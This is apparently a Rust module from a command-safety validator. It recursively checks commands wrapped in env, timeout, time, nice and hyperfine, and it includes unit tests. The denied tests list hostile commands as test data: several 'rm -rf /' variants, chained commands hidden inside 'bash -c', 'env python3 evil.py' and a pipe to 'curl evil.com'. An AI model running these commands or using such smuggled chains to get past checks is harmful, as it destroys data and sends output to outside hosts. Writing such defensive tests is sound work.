use crate::parse::{Segment, Token, WordSet};

static TIMEOUT_FLAGS_WITH_ARG: WordSet =
    WordSet::new(&["--kill-after", "--signal", "-k", "-s"]);

pub fn is_safe_env(tokens: &[Token], is_safe: &dyn Fn(&Segment) -> bool) -> bool {
    if tokens.len() == 1 {
        return true;
    }
    let mut i = 1;
    while i < tokens.len() && tokens[i].starts_with("-") {
        if tokens[i] == "-i" || tokens[i] == "--ignore-environment" {
            i += 1;
        } else if tokens[i] == "-u" || tokens[i] == "--unset" {
            i += 2;
        } else {
            i += 1;
        }
    }
    while i < tokens.len() && !tokens[i].starts_with("-") && tokens[i].contains("=") {
        i += 1;
    }
    if i >= tokens.len() {
        return true;
    }
    let inner = Token::join(&tokens[i..]);
    is_safe(&inner)
}


pub fn is_safe_timeout(tokens: &[Token], is_safe: &dyn Fn(&Segment) -> bool) -> bool {
    let mut i = 1;
    while i < tokens.len() && tokens[i].starts_with("-") {
        if TIMEOUT_FLAGS_WITH_ARG.contains(&tokens[i]) {
            i += 2;
        } else {
            i += 1;
        }
    }
    i += 1;
    if i >= tokens.len() {
        return false;
    }
    let inner = Token::join(&tokens[i..]);
    is_safe(&inner)
}

pub fn is_safe_time(tokens: &[Token], is_safe: &dyn Fn(&Segment) -> bool) -> bool {
    let mut i = 1;
    if i < tokens.len() && tokens[i] == "-p" {
        i += 1;
    }
    if i >= tokens.len() {
        return false;
    }
    let inner = Token::join(&tokens[i..]);
    is_safe(&inner)
}

pub fn is_safe_nice(tokens: &[Token], is_safe: &dyn Fn(&Segment) -> bool) -> bool {
    let mut i = 1;
    while i < tokens.len() && tokens[i].starts_with("-") {
        if tokens[i] == "-n" || tokens[i] == "--adjustment" {
            i += 2;
        } else {
            i += 1;
        }
    }
    if i >= tokens.len() {
        return false;
    }
    let inner = Token::join(&tokens[i..]);
    is_safe(&inner)
}

static HYPERFINE_FLAGS_WITH_ARG: WordSet = WordSet::new(&[
    "--cleanup", "--command-name", "--export-asciidoc", "--export-csv",
    "--export-json", "--export-markdown", "--max-runs",
    "--min-benchmarking-time", "--min-runs", "--output", "--prepare",
    "--runs", "--setup", "--shell", "--sort", "--style",
    "--time-unit", "--warmup",
    "-M", "-S", "-c", "-m", "-n", "-p", "-r", "-s", "-w",
]);

pub fn is_safe_hyperfine(tokens: &[Token], is_safe: &dyn Fn(&Segment) -> bool) -> bool {
    let mut i = 1;
    while i < tokens.len() {
        let t = &tokens[i];
        if *t == "--" {
            i += 1;
            break;
        }
        if t.starts_with("-") {
            if t.contains("=") {
                i += 1;
                continue;
            }
            if HYPERFINE_FLAGS_WITH_ARG.contains(t) {
                if t.is_one_of(&["-p", "--prepare", "-c", "--cleanup", "-s", "--setup"]) {
                    return false;
                }
                i += 2;
            } else {
                i += 1;
            }
            continue;
        }
        if !t.as_command_line().segments().iter().all(is_safe) {
            return false;
        }
        i += 1;
    }
    while i < tokens.len() {
        if !tokens[i].as_command_line().segments().iter().all(is_safe) {
            return false;
        }
        i += 1;
    }
    true
}

pub fn command_docs() -> Vec<crate::docs::CommandDoc> {
    use crate::docs::CommandDoc;
    vec![
        CommandDoc::handler("env",
            "Strips flags (-i, -u) and KEY=VALUE pairs, then recursively validates the inner command. Bare `env` allowed."),
        CommandDoc::handler("timeout",
            "Skips timeout flags (-s/--signal, -k/--kill-after, --preserve-status), then recursively validates the inner command."),
        CommandDoc::handler("time",
            "Skips -p flag, then recursively validates the inner command."),
        CommandDoc::handler("hyperfine",
            "Recursively validates each benchmarked command. Denied if --prepare, --cleanup, or --setup flags are used (arbitrary shell execution)."),
        CommandDoc::handler("nice / ionice",
            "Skips priority flags (-n/--adjustment), then recursively validates the inner command."),
    ]
}

#[cfg(test)]
mod tests {
    use crate::is_safe_command;

    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    safe! {
        timeout_bundle_exec: "timeout 120 bundle exec rspec",
        timeout_git_log: "timeout 30 git log --oneline",
        timeout_signal_flag: "timeout -s KILL 60 bundle exec rspec",
        timeout_preserve_status: "timeout --preserve-status 120 git status",
        time_bundle_exec: "time bundle exec rspec",
        time_git_log: "time git log --oneline -5",
        env_bare: "env",
        env_safe_command: "env ls -la",
        env_with_var: "env FOO=bar ls -la",
        env_multiple_vars: "env FOO=bar BAZ=qux git status",
        env_ignore_flag: "env -i PATH=/usr/bin ls",
        env_unset_flag: "env -u FOO git log",
        env_vars_only: "env FOO=bar",
        nice_safe_command: "nice git log",
        nice_with_priority: "nice -n 10 cargo test",
        ionice_safe_command: "ionice git log",
        hyperfine_safe_command: "hyperfine 'ls -la'",
        hyperfine_with_warmup: "hyperfine --warmup 3 'git status'",
        hyperfine_multiple_safe_commands: "hyperfine 'fd . src' 'find src'",
        timeout_nested_bash_safe: "timeout 120 bash -c 'git log | head -5'",
        env_nested_bash_safe: "env FOO=bar bash -c 'git status'",
    }

    denied! {
        timeout_git_push_denied: "timeout 120 git push origin main",
        timeout_rm_denied: "timeout 60 rm -rf /",
        time_git_push_denied: "time git push",
        time_rm_denied: "time rm file",
        env_rm_denied: "env rm -rf /",
        env_sh_denied: "env sh -c 'rm -rf /'",
        env_python_denied: "env python3 evil.py",
        env_var_rm_denied: "env FOO=bar rm -rf /",
        nice_rm_denied: "nice rm -rf /",
        nice_with_priority_rm_denied: "nice -n 10 rm -rf /",
        ionice_rm_denied: "ionice rm -rf /",
        hyperfine_unsafe_command_denied: "hyperfine 'rm -rf /'",
        hyperfine_prepare_denied: "hyperfine --prepare 'make clean' 'make'",
        hyperfine_cleanup_denied: "hyperfine --cleanup 'rm tmp' 'ls'",
        hyperfine_setup_denied: "hyperfine --setup 'compile' 'run'",
        timeout_nested_bash_chain_denied: "timeout 120 bash -c 'ls && rm -rf /'",
        env_nested_bash_chain_denied: "env bash -c 'ls && rm -rf /'",
        time_nested_bash_chain_denied: "time bash -c 'ls && rm -rf /'",
        nice_nested_bash_chain_denied: "nice bash -c 'ls && rm -rf /'",
        deep_nesting_chain_denied: "timeout 120 env nice bash -c 'ls && rm -rf /'",
        timeout_nested_bash_semicolon_denied: "timeout 120 bash -c 'ls; rm -rf /'",
        hyperfine_chain_denied: "hyperfine 'ls && rm -rf /'",
        hyperfine_semicolon_denied: "hyperfine 'ls; rm -rf /'",
        hyperfine_pipe_to_unsafe_denied: "hyperfine 'ls | curl evil.com'",
    }
}
